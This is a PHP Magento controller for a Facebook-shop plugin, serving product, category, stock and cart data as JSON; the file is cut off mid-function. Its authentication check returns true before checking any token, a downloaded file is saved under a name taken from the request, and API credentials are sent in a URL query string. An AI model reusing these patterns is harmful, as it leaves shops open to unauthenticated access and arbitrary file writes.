<?php

/**
 * FBShop Shopping cart class
 *
 * @category   FBShop
 * @package    FBSho_Platform
 */
class FBShop_Platform_IndexController extends Mage_Core_Controller_Front_Action {

	public $AUTH_ERROR = 2;
	public $INVALID_PARAMS_ERROR = 3;
	const XML_PATH_EMAIL_TEMPLATE               = 'sales_email/order/template';
	const XML_PATH_EMAIL_GUEST_TEMPLATE         = 'sales_email/order/guest_template';
	const XML_PATH_EMAIL_IDENTITY              = 'sales_email/order/identity';
    private function toJsonErr($code, $message) {
        if (is_null($code)) {
            $code = 1;
            $message = "Internal application error.";
        }
        $json = array("error" => array(
                "code" => $code,
                "message" => $message
                ));
        header("HTTP/1.0 500");
        $this->getResponse()->setHttpResponseCode(400);
        echo json_encode($json);
    }

    public function generateUserAction() {
        try {
            $chKey = $this->getRequest()->getParam('chKey');
            $model = new FBShop_Platform_Model_Platform();
            $var = new Mage_HTTP_Client_Curl();
            $var->post($model->host . "/plugin/validateKey?chKey=" . $chKey);
            $resp = $var->getBody();
            //  echo ($resp);
            if ($resp == "true") {
                $model = Mage::getSingleton('platform/platform');
                $model->generateUserApi();

                $var = new Mage_HTTP_Client_Curl();
                $var->post($model->host . "/plugin/sendKeys?apiUser=" . $model->userApi . "&apiKey=" . $model->pswApi . "&chKey=" . $chKey);

                $json = array("status" => "true");
            } else {
                $json = array("status" => "false");
            }
             echo json_encode($json);
        } catch (Exception $e) {
            $json = array("status" => "false");
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
       
    }

    private function loginUser() {
        $token = $this->getRequest()->getParam('token');
        return true;
        if (isset($token)) {
            $arg = explode(".", $token);

            $usr = base64_decode($arg[0]);
            $pas = base64_decode($arg[1]);
            // echo $usr."=========".$pas;
            $model = Mage::getSingleton('platform/platform');
            $model->loadUserApi();
            //  echo"<br>".$model->user."=========".$model->psw;
            if (($usr == $model->userApi) && ($pas == $model->pswApi))
                return true;
        }

        header("HTTP/1.0 500");
        throw new Exception("Authentication failed invalid token! ", $this->AUTH_ERROR);
    }

    public function indexAction() {
//    res.setHeader("P3P", "CP=\"IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\"");
        //   $this->getResponse()->setHeader("P3P",'CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"');
        //getResponse()->setHeader("content-type", "application/json; charset=utf-8")   ;    
        //  header('content-type: application/json; charset=utf-8')


        $this->loadLayout();
        $this->renderLayout();
    }

    public function check_pluginAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        $model = new FBShop_Platform_Model_Platform();
        $arr = array('version' => $model->version);
        echo json_encode($arr);
    }

    public function productsIdsAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        try {
            $this->loginUser();
            $categoryId = $this->getRequest()->getParam('categoryId');
            if (!is_numeric($categoryId)) {
                throw new Exception("Category ID is required.", $this->INVALID_PARAMS_ERROR);
            }

            $_rootcatID = Mage::app()->getStore()->getRootCategoryId();
            if ($_rootcatID == $categoryId)
                return;

            $category = Mage::getModel('catalog/category')->load($categoryId);
            $json = array();
            if ($category->getId() != NULL) {
                $products = Mage::getResourceModel('catalog/product_collection')
                        ->joinField('category_id', 'catalog/category_product', 'category_id', 'product_id=entity_id', null, 'left')
                        ->addAttributeToFilter('category_id', array('in' => $categoryId))
                        ->setVisibility(array(2, 3, 4))
                        ->addAttributeToSelect('*');
                $productIds = $products->getAllIds();
//           print_r($productIds);
                if ($productIds == NULL) {
                    $products = $category->getProductCollection()->setVisibility(array(2, 3, 4));

                    $productIds = $products->getAllIds();
                    foreach ($productIds as $id) {
                        $product = Mage::getModel("catalog/product")->load($id);
                        $prodCategory = $this->getProductCategory($product);
                        $p = false;
                        foreach ($prodCategory as $prodCategoryId)
                            if ((int) $prodCategoryId == (int) $categoryId) {
                                $p = true;
                                break;
                            }
                        if ($p)
                            $json[] = (int) $id;
                    }
                } else {
//if ($productIds == NULL) 

                    foreach ($productIds as $prod) {
                        $json[] = (int) $prod;
                    }
                }
            } else
                throw new Exception("Invalid category ID.", $this->INVALID_PARAMS_ERROR);
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function productsIdsNameAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        try {
            $this->loginUser();
            $categoryId = $this->getRequest()->getParam('categoryId');
            if (empty($categoryId)) {
                throw new Exception("Category ID is required.", $this->INVALID_PARAMS_ERROR);
            }

            $category = Mage::getModel('catalog/category')->load($categoryId);
            $json = array();
            if ($category->getId() != NULL) {
                $products = Mage::getResourceModel('catalog/product_collection')
                        ->joinField('category_id', 'catalog/category_product', 'category_id', 'product_id=entity_id', null, 'left')
                        ->addAttributeToFilter('category_id', array('in' => $categoryId))
                        ->setVisibility(array(2, 3, 4))
                        ->addAttributeToSelect('*');
                $productIds = $products->getAllIds();

                if ($productIds == NULL) {
                    $products = $category->getProductCollection()->setVisibility(array(2, 3, 4));

                    $productIds = $products->getAllIds();
                    foreach ($productIds as $id) {
                        $product = Mage::getModel("catalog/product")->load($id);
                        $prodCategory = $this->getProductCategory($product);
                        $p = false;
                        foreach ($prodCategory as $prodCategoryId)
                            if ((int) $prodCategoryId == (int) $categoryId) {
                                $p = true;
                                break;
                            }
                        if ($p)
                            $json[] = array("productId" => (int) $product->getId(),
                                "name" => $product->getName());
                    }
                } else {

                    foreach ($productIds as $prod) {
                        $product = Mage::getModel("catalog/product")->load((int) $prod);
                        $json[] = array("productId" => (int) $product->getId(),
                            "name" => $product->getName());
                    }
                }
            } else
                throw new Exception("Invalid category ID.", $this->INVALID_PARAMS_ERROR);
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function allCategoriesAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        try {
            $this->loginUser();

            $json = array();
            $category = new Mage_Catalog_Model_Category();
            $tree = $category->getTreeModel();
            $tree->load();
            $ids = $tree->getCollection()->getAllIds();
            if ($ids) {
                $json = array();
                foreach ($ids as $id) {
                    $_rootcatID = Mage::app()->getStore()->getRootCategoryId();
                    if ($id == $_rootcatID)
                        continue;
                    $cat = new Mage_Catalog_Model_Category();
                    $cat->load($id);
                    if ($cat->getIsActive()) {
                        $url = null;
                        if ($image = $cat->getImage()) {
                            $url = Mage::getBaseUrl('media') . 'catalog/category/' . $image;
                        }


                        $_rootcatID = Mage::app()->getStore()->getRootCategoryId();
                        $gsonCategory = array("id" => (int) $cat->getId(),
                            "name" => $cat->getName(),
                            "parentId" => ((int) $cat->getParentId() == (int) $_rootcatID) ? 1 : (int) $cat->getParentId(),
                            "description" => $cat->getDescription(),
                            "image" => $url);

                        if ($cat->getDescription() == null) {
                            unset($gsonCategory['description']);
                        }
                        if ($url == null) {
                            unset($gsonCategory['image']);
                        }

                        $json[] = $gsonCategory;
                    }
                }
            }
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function getCategoryByIdAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        try {
            $this->loginUser();
            $categoryId = $this->getRequest()->getParam('categoryId');
            if (empty($categoryId)) {
                throw new Exception("Category  ID is required.", $this->INVALID_PARAMS_ERROR);
            }
            $category_model = Mage::getModel('catalog/category');
            $category = $category_model->load($categoryId);
            $_rootcatID = Mage::app()->getStore()->getRootCategoryId();
            if ($category->getId() == $categoryId) {
                if ($category->getIsActive()) {
                    $all_child_categories = $category->getChildren();
                    $childIds = explode(",", $all_child_categories);
                    foreach ($childIds as $id)
                        $ids[] = (int) $id;
                    $url = null;
                    if ($image = $category->getImage()) { {
                            $url = Mage::getBaseUrl('media') . 'catalog/category/' . $image;
                        }
                    }
                    $thumbnail = null;
                    if ($image = $category->getThumbnail()) { {
                            $thumbnail = Mage::getBaseUrl('media') . 'catalog/category/' . $image;
                        }
                    }

                    $gsonCategory = array("id" => $category->getId(),
                        "name" => $category->getName(),
                        "parentId" => ($category->getParentId() != $_rootcatID) ? $category->getParentId() : 1,
                        "description" => $category->getDescription(),
                        "image" => $url,
                        "thumbnail" => $thumbnail,
                        "childs" => $ids);

                    if ($category->getDescription() == null) {
                        unset($gsonCategory['description']);
                    }
                    if ($url == null) {
                        unset($gsonCategory['image']);
                    }
                    if ($thumbnail == null) {
                        unset($gsonCategory['thumbnail']);
                    }
                    $json = $gsonCategory;
                }
                echo json_encode($json);
            } else
                throw new Exception("Category  ID is invalid.", $this->INVALID_PARAMS_ERROR);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function isInStockAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        try {
            $this->loginUser();
            $id = $this->getRequest()->getParam('productId');
            if (empty($id)) {
                throw new Exception("Product ID is required.", $this->INVALID_PARAMS_ERROR);
            }
            $json = array();
            $ids = explode("|", $id);
            if (count($ids)) {
                foreach ($ids as $id) {
                    $product = Mage::getModel('catalog/product')->load($id);
                    $s = false;
                    if ($product->getId() != NULL) {

                        $stock = Mage::getModel('cataloginventory/stock_item')->loadByProduct($product);
                        $qtyStock = $stock->getQty();
                        $s=$product->isAvailable();
//                       if ($stock->getIsInStock()) {
//                               $s = true;
//                        }
                        if (count($ids) != 1)
                            $json[] = array("qty" => ($s) ? $qtyStock : "0",
                                "productId" => $id,
                                "isInStock" => ($s) ? "true" : "false");
                        else
                            $json = array("qty" => ($s) ? $qtyStock : "0",
                                "productId" => $id,
                                "isInStock" => ($s) ? "true" : "false");
                    }else
                        throw new Exception("Product ID is invalid.", $this->INVALID_PARAMS_ERROR);
                }
                echo json_encode($json);
            } else
                throw new Exception("Product ID is invalid.", $this->INVALID_PARAMS_ERROR);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function getCurrencyStoreAction() {

        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        try {
            $this->loginUser();
            $code = Mage::app()->getStore()->
                    getCurrentCurrencyCode();

            $symbol = Mage::app()->getLocale()->currency($code)->getSymbol();
            $name = Mage::app()->getLocale()->currency($code)->getName();

            $json = array('code' => $code,
                'symbol' => $symbol,
                'name' => $name);
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    function productByIdAction() {
//        die("ok");

        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        // die("ok");
//$app=Mage::app();
//$app->contentType('application/json');
        try {
            $this->loginUser();
            $productId = $this->getRequest()->getParam('productId');
            if (!isset($productId)) {
                throw new Exception("Product ID is required.", $this->INVALID_PARAMS_ERROR);
            }

            $product = Mage::getModel('catalog/product')->load($productId);
            if ($product->getId() != NULL) {

                $data = $product->getData();
                $stock = Mage::getModel('cataloginventory/stock_item')->loadByProduct($product);
                        $qtyStock = $stock->getQty();
                       $s=$product->isAvailable();
                $json = array(
                    "productId" => $data["entity_id"],
                    "name" => $data["name"],
                    "sku" => $data["sku"],
                    "productType" => $product->getTypeId(),
                    "shortDescription" => $data["short_description"],
                    "description" => $data["description"],
                    "price" => doubleval(str_replace(",", ".", Mage::helper('tax')->getPrice($product, $product->getPrice(), true))),
                    "tierPrices" => $this->getTierPrice($product),
                    "cost" => doubleval(str_replace(",", ".", $data["price"])),
                    "specialPrice" => Mage::helper('tax')->getPrice($product, $product->getSpecialPrice(), true),
                    "enabled" => $data["status"],
                    "weight" => $data["weight"],
                    "taxClass" => $data["tax_class_id"],
                    "qty" => ($s) ? $qtyStock : "0",
                    "visible" => ($data["visibility"] > 1) ? "true" : "false",
                    "inStock" => ($s) ? "true" : "false",
                    "createTime" => $data["created_at"] . " 00:00:00",
                    "attributes" => $this->productAttributes($productId),
                    "associatedProducts" => $this->productAssociated($productId),
                    "customOptions" => $this->productOptions($productId),
                    "categoriesIds" => $this->getProductCategory($product),
                    "bundleOptions" => $this->getBundleOptions($product),
                    "medias" => $this->mediaGallery($product),
                    "imageUrl" => $data["thumbnail"],
                );

                if ($product->getTypeId() == "bundle") { 

                    list($min, $max) = $product->getPriceModel()->getTotalPrices($product, null, null, false);
                    $json["priceFrom"] = $min;
                    $json["priceTo"] = $max;
                    $json["priceView"] = $product->getPriceView();
                    $json["isFixed"] = ($product->getPriceType() == 1) ? "true" : "false";
                }
//                if ($json["specialPrice"]==0) unset($json["specialPrice"]);

                $json = json_encode($json);
                echo $json;
            } else
                throw new Exception("Product ID is invalid.", $this->INVALID_PARAMS_ERROR);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function getBundleOptions($product) {
        $isProductBundle = ($product->getTypeId() == 'bundle');
        $optionRawData = array();
        $json = array();
        if ($isProductBundle) {
            $product->getTypeInstance(true)->setStoreFilter($product->getStoreId(), $product);
            $optionCollection = $product->getTypeInstance(true)->getOptionsCollection($product);
            $selectionCollection = $product->getTypeInstance(true)->getSelectionsCollection(
                    $product->getTypeInstance(true)->getOptionsIds($product), $product
            );
            $optionCollection->appendSelections($selectionCollection);

            $optionRawData = array();
            $selectionRawData = array();

            $i = 0;
            foreach ($optionCollection as $option) {
                $optionRawData[$i] = array(
                    "optionId" => (int) $option->getOptionId(),
                    "required" => ($option->getData('required') != 0) ? "true" : "false",
                    "position" => $option->getData('position'),
                    "type" => $option->getData('type'),
                    "title" => $option->getData('title') ? $option->getData('title') : $option->getData('default_title'),
                    "maxPrice" => $option->getMaxPrice(),
                    "minPrice" => $option->getMinPrice(),
                    "tierPrice" => $option->getTierPrice(),
                    "specialPrice" => $option->getSpecialPrice(),
                );
                foreach ($option->getSelections() as $selection) {

                    $selectionRawData[$i][] = array(
                        "productId" => (int) $selection->getProductId(),
                        "id" => $selection->getSelectionId(),
                        "name" => $selection->getName(),
                        "position" => $selection->getPosition(),
                        "isDefault" => ($selection->getIsDefault() != 0) ? "true" : "false",
                        "priceType" => $selection->getSelectionPriceType(),
                        "priceValue" => $selection->getSelectionPriceValue(),
                        "price" => $selection->getPrice(),
                        "maxPrice" => $selection->getMaxPrice(),
                        "minPrice" => $selection->getMinPrice(),
                        "tierPrice" => $selection->getTierPrice(),
                        "specialPrice" => $selection->getSpecialPrice(),
                        "qty" => $selection->getSelectionQty(),
                        "canChangeQty" => ($selection->getSelectionCanChangeQty() != 0) ? "true" : "false",
                    );
                }
                // $optionRawData[$i]['bundleValues']=$selectionRawData[$i];

                $json[] = array("option" => $optionRawData[$i],
                    "values" => $selectionRawData[$i]);
                $i++;
            }


//$product->setBundleOptionsData($optionRawData);   //changed it to $product
//$product->setBundleSelectionsData($selectionRawData);  //changed it to $product
        }
        return ($json);
    }

    public function getSpecialPriceByIdAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            $productId = $this->getRequest()->getParam('productId');
            if (!isset($productId)) {
                throw new Exception("Product ID is required.", $this->INVALID_PARAMS_ERROR);
            }

            $product = Mage::getModel('catalog/product')->load($productId);
            if ($product->getId() != NULL) {
                $json = array("productId" => $product->getId(),
                    "speciaPrice" => $product->getSpecialPrice());

                $json = json_encode($json);
                echo $json;
            }
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    public function productAttributes($productId) {

//        $productId = $this->getRequest()->getParam('productId');

        $product = Mage::getModel('catalog/product')->load($productId);
        $json = array();
        $attributes = $product->getAttributes();

        foreach ($attributes as $attribute) {
            if (($attribute->getIsFilterableInSearch()) || ($attribute->getIsSearchable()) || ($attribute->getIsVisibleOnFront())) {


                $id = $attribute->getAttributeId();
                $value = $attribute->getFrontend()->getValue($product);
                if (!is_string($value))
                    $value = null;
                $code = $attribute->getAttributeCode();
                $type = $attribute->getFrontendInput();
                $label = $attribute->getFrontendLabel();
                $position = $attribute->getPosition();
//      print_r($attribute);
//               die();         
                $json[] = array("attribute" => array(
                        "id" => (int) $id,
                        "value" => (String) $value,
                        "productId" => (int) $productId,
                        "code" => $code,
                        "attributeType" => $type,
                        "label" => $label,
                        "position" => $position,
                        "searchable" => ($attribute->getIsSearchable()) ? "true" : "false",
                        "visible" => ($attribute->getIsVisibleOnFront()) ? "true" : "false",
                        "filtrable" => ($attribute->getIsFilterableInSearch()) ? "true" : "false",
                        "comparable" => ($attribute->getIsComparable()) ? "true" : "false",
                        "sortable" => ($attribute->getUsedForSortBy()) ? "true" : "false",
                        "configurable" => "false"
                        ));
            }
        }


        $product = Mage::getModel("catalog/product")->load($productId);
        if ($product->isConfigurable()) {
            $productAttributeOptions = $product->getTypeInstance(true)->getConfigurableAttributesAsArray($product);
            $attributeOptions = array();
            foreach ($productAttributeOptions as $productAttribute) {
                $option = array();
                foreach ($productAttribute['values'] as $attribute) {
                    $products_by_attribut = array();
                    $childProducts = Mage::getModel('catalog/product_type_configurable')
                            ->getUsedProducts(null, $product);

                    foreach ($childProducts as $productChild) {
                        $data = $productChild->getData();
                        if ($data[$productAttribute["attribute_code"]] == $attribute['value_index'])
                            $products_by_attribut[] = (int) $productChild->getId();
                    }
//echo "<pre>";
//print_r($attribute);
//echo "</pre>";

                    $option[] = array(
                        "id" => (int) $attribute['value_index'],
                        "label" => $attribute['store_label'],
                        "price" => (float) $attribute["pricing_value"],
                        "products" => $products_by_attribut);
                }

                $_attribute = Mage::getModel('eav/entity_attribute')->load($productAttribute['attribute_id']);

                $json[] = array("attribute" => array(
                        "productId" => (int) $productId,
                        "id" => (int) $productAttribute['attribute_id'],
                        "label" => $productAttribute["label"],
                        "code" => $productAttribute["attribute_code"],
                        "position" => (int) $productAttribute["position"],
                        "attributeType" => $_attribute->getFrontendInput(),
                        "searchable" => ($_attribute->getIsSearchable()) ? "true" : "false",
                        "visible" => ($_attribute->getIsVisibleOnFront()) ? "true" : "false",
                        "filtrable" => ($_attribute->getIsFilterableInSearch()) ? "true" : "false",
                        "comparable" => ($_attribute->getIsComparable()) ? "true" : "false",
                        "sortable" => ($_attribute->getUsedForSortBy()) ? "true" : "false",
                        "configurable" => ($_attribute->getIsConfigurable()) ? "true" : "false",
                        "required" => ($_attribute->getIsRequired()) ? "true" : "false"),
                    "options" => $option);
            }
        }


        return $json;
    }

    public function productAttributesAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
        $productId = $this->getRequest()->getParam('productId');
        $json = array();
        $json = array("attributes" => $this->productAttributes($productId));
    }

    public function productOptions($productId) {
        $product = Mage::getModel("catalog/product")->load($productId);

        //  $product = Mage::getModel("catalog/product")->load(26);
        $i = 1;

        $json = array();
        foreach ($product->getOptions() as $o) {

            $values = $o->getValues();
//            var_dump($values);
//                die();
            $value = array();
            foreach ($values as $v) {

                $value[] = array(
                    "title" => $v->getTitle(),
                    "sku" => $v->getSku(),
                    "price" => (float) $v->getPrice(),
                    "priceType" => $v->getPriceType(),
                    "id" => (int) $v->getOptionTypeId(),
                    "position" => (int) $v->getSortOrder()
                );
            }
            $json[] = array("option" => array(
                    "id" => (int) $o->getOptionId(),
                    "title" => $o->getTitle(),
                    "type" => $o->getType(),
                    "priceType" => $o->getPriceType(),
                    "position" => (int) $o->getSortOrder(),
                    "required" => ($o->getIsRequire()) ? "true" : "false",
                    "fileExtension" => $o->getFileExtension(),
                    "imageSizeX" => $o->getImageSizeX(),
                    "imageSizeY" => $o->getImageSizeY(),
                    "maxCharacters" => $o->getMaxCharacters(),
                    "price" => $o->getPrice()
                ), "values" => $value,
            );
        }
        return $json;
    }

    public function productAssociated($productId) {

//        $productId = $this->getRequest()->getParam('productId');

        $product = Mage::getModel('catalog/product')->load($productId);
        $json = array();
        if ($product->getTypeId() == 'grouped') {
            $associatedProducts = $product->getTypeInstance(true)->getAssociatedProducts($product);
            foreach ($associatedProducts as $associatedProduct) {
                $json[] = (int) $associatedProduct->getId();
            }
        }
        return $json;
    }

//****************************************************************************888


    function responseCart() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        $add = $this->getRequest()->getParam('add');
        $del = $this->getRequest()->getParam('del');
        $remove = $this->getRequest()->getParam('clear');
        $get = $this->getRequest()->getParam('get');
        if (!empty($add)) {
            $this->addToCart($this->getRequest());
            return;
        } else if (!empty($del)) {
            $this->delToCart();
            return;
        } else if (!empty($remove)) {
            $this->removeCart();
            return;
        } else if (!empty($get)) {
            $this->getItemsToCart();
            return;
        }
    }

    function addToCart($request) {
        try {
            $flag = $this->getRequest()->getPost("flag");
            $cartId = $this->getRequest()->getParam('cartId');
            $filePath = "";
            $p = false;
            if (empty($flag)) {
                try {
                    if (empty($cartId)) {

                        $cart = Mage::getSingleton('checkout/cart');
                        $cart->save();
                        $cartId = $cart->getQuote()->getId();
                        $flag = 1;
                    } else {
                        $flag = 2;
                    }
                    $products = $this->getRequest()->getParam('product');
                    $this->removeCart();
                    foreach ($products as $param) {
                        $params = array();
                        foreach ($param as $key => $value) {
                            if (base64_decode($key) == "file") {

                                $model = Mage::getModel('platform/platform');
                                $var = new Mage_HTTP_Client_Curl();
                                $file = file($model->host . "/cart/download/" . $value["key"]);
                                $filePath = sys_get_temp_dir() . "/" . $value["name"];
                                file_put_contents($filePath, $file);
                                $params["options_" . $value["optionId"] . "_file"] = "@" . $filePath;
                                $params["options_" . $value["optionId"] . "_file_action"] = "save_new";
                            } else {
                                $params[base64_decode($key)] = $value;
                            }
                        }
                        $params["add"] = 1;
                        $params["flag"] = $flag;
                        $params["cartId"] = $cartId;
                        $var = new Mage_HTTP_Client_Curl();
                        $header = array("Content-type: multipart/form-data");
                        $arr = array(CURLOPT_POSTFIELDS => $params,
                            CURLOPT_RETURNTRANSFER => 1,
                            CURLOPT_VERBOSE => 1,
                            CURLOPT_HTTPHEADER => $header
                        );
                        $var->setOptions($arr);
                        $var->post(Mage::getUrl("FBShop/index/cart"));
                        $p = $var->getBody();

                    }
                } catch (Exception $e) {
                    echo $e->getMessage();
                    return;
                }
            } else {
                try {
                    $cartId = $this->getRequest()->getParam('cartId');
                    $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
                    $quote->setIsActive(true);
                    Mage::getSingleton('checkout/cart')->setQuote($quote);
                    Mage::getSingleton('checkout/session')->setLastQuoteId($cartId);

                    $cart = Mage::getSingleton('checkout/cart');
                    $params = $this->getRequest()->getParams();
//                print_r($_FILES);
                    $product = Mage::getModel('catalog/product')
                            ->load($params["product"]);
                    $cart->addProduct($product, $params);
                    $cart->save();
//                echo "cartId=".$cart->getQuote()->getId();
                    Mage::getSingleton('checkout/session')->setCartWasUpdated(true);
                    echo true;
                    return;
                } catch (Exception $e) {
                    echo $e->getMessage();
                    echo false;
                    return;
                }
            }
            if (!empty($filePath)) {
                unlink($filePath);
            }
            if (is_numeric($cartId) && ($flag == 2)) {

                $this->loginUser();

                header("Content-Type: application/json");
                header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
//            $json=array();
//            $json ["status"] = ($p) ? "true" : "false";
//            echo json_encode($json);
                if ($p)
                    $json["cartId"] = $cartId;
                else
                    echo $p;
                echo json_encode($json);
            } elseif ($flag == 1) {
                $json = array();
//                  $json ["status"] = ($p) ? "true" : "false";
                if ($p)
                    $json["cartId"] = $cartId;
                else
                    echo $p;
                echo json_encode($json);
//                  die("mashaaa");
            }
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    function delToCart() {

        $products = explode('|', $this->getRequest()->getParam('del'));
        if (isset($products)) {
            $cart = Mage::getSingleton('checkout/cart');
            foreach (Mage::getSingleton('checkout/session')->getQuote()->getItemsCollection() as $item) {
                //    $data=$item->getData();
                foreach ($products as $productId) {
                    if ($productId == $item->getId()) {
                        $cart->removeItem($item->getId());
                    }
                }
            }
            $cart->save();
            $this->_redirect('checkout/cart');
        }
    }

    function removeCart() {
        foreach (Mage::getSingleton('checkout/session')->getQuote()->getItemsCollection() as $item) {
            Mage::getSingleton('checkout/cart')->removeItem($item->getId())->save();
        }
        Mage::getSingleton('checkout/session')->clear();
        return;
    }

    function getItemsToCart() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        $items = Mage::getSingleton('checkout/session')->getQuote()->getAllItems();
        $cart = Mage::getModel('checkout/cart')->getQuote();
        $subTotal = $cart->getSubtotal();
        $grandTotal = $cart->getGrandTotal();

        foreach ($items as $item) {
            //$data=$item->getData();
            //   var_dump($item);
            //  die();

            $product = Mage::getModel('catalog/product')->load($item->getProductId());
            $json[] = array('id' => $item->getProductId(),
                'qty' => $item->getQty(),
                'name' => $item->getName(),
                'price' => $item->getPrice(),
                'thumbnail' => (string) Mage::helper("catalog/image")->init($product, "image")->resize(75, 75));
        }

        $json['subTotal'] = $subTotal;
        $json['grandTotal'] = $grandTotal;
        $jsonn = json_encode($json);
        echo $jsonn;
    }

    public function cartAction() {

        $cartId = $this->getRequest()->getParam('id');
        $request = $this->getRequest();
        $returnUrl = $this->getRequest()->getParam('returnUrl');
        $token = $this->getRequest()->getParam('token');
        if ($request->isGet() && (!empty($cartId))) {
            try {
                if (!empty($returnUrl))
          Mage::getSingleton('core/session')->setReturnUrl($returnUrl);
                if (!empty($token))
          Mage::getSingleton('core/session')->setToken($token);
                
//                $host = $request->getParam('request');
//                $token = $request->getParam('token');
//                $shopName = $request->getParam('shopName');
//                $facebookAppName = $request->getParam('facebookAppName');
                

//                Mage::getSingleton('core/session')->setHost($host);
//                Mage::getSingleton('core/session')->setToken($token);
//                Mage::getSingleton('core/session')->setShopName($shopName);
//                Mage::getSingleton('core/session')->setFacebookAppName($facebookAppName);
                
                Mage::getSingleton('core/session')->setAdd(true);
                $this->loginCostumerCreate($request);
                $this->loadCartAction($cartId);
                   $this->_redirect('checkout/cart/');

                return;
             } catch (Exception $e) {

            }
        }



        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        $this->responseCart();
    }

    public function loadCartAction($cartId) {
        if (empty($cartId))
            $cartId = $this->getRequest()->getParam("cartId");
        $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
        $quote->setIsActive(true);
        Mage::getSingleton('checkout/cart')->setQuote($quote);
        Mage::getSingleton('checkout/session')->setLastQuoteId($cartId);
        Mage::getSingleton('checkout/cart')->save();
        Mage::getSingleton('checkout/session')->setCartWasUpdated(true);
    }

    public function bestsellingAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
     
            $this->loginUser();
            $days = $this->getRequest()->getParam("days");
            $productCount = $this->getRequest()->getParam("top");
          if (!isset($days) && !isset($productCount))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
              
            $storeId = Mage::app()->getStore()->getId();
            $today = time();
            $last = $today - (60 * 60 * 24 * $days);

            $from = date("Y-m-d", $last);
            $to = date("Y-m-d", $today);

           
            $products = Mage::getResourceModel('reports/product_collection')
                    ->addAttributeToSelect('*')
                    ->addOrderedQty($from, $to)
                    ->setStoreId($storeId)
                    ->addStoreFilter($storeId)
                    ->setOrder('ordered_qty', 'desc')
                    ->setPageSize($productCount);

            $json = array();
            foreach ($products as $ptoduct){
                $orderQty = $ptoduct->getOrderedQty();
                $productId=$ptoduct->getId();

            $json[] = array('id' => $productId,
                             'count' => $orderQty );
            }
            $jsonn = json_encode($json);
            echo $jsonn;
            return;
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function mostViewAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
           
            $days = $this->getRequest()->getParam("days");
            $productCount = $this->getRequest()->getParam("top");
          if (!isset($days) && !isset($productCount))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
              
             $storeId = Mage::app()->getStore()->getId();
            // get today and last 30 days time
            $today = time();
            $last = $today - (60 * 60 * 24 * $days);

            $from = date("Y-m-d", $last);
            $to = date("Y-m-d", $today);

            // get most viewed products for last 30 days
            $products = Mage::getResourceModel('reports/product_collection')
                    ->addAttributeToSelect('*')
                    ->setStoreId($storeId)
                    ->addStoreFilter($storeId)
                    ->addViewsCount()
                    ->addViewsCount($from, $to)
                    ->setPageSize($productCount);

$json = array();
            foreach ($products as $item) {
              $json[] = array("id" => $item->getId(),
                    "count" => $item->getViews());
            }
            echo json_encode($json);
        } catch (Exception $e) {
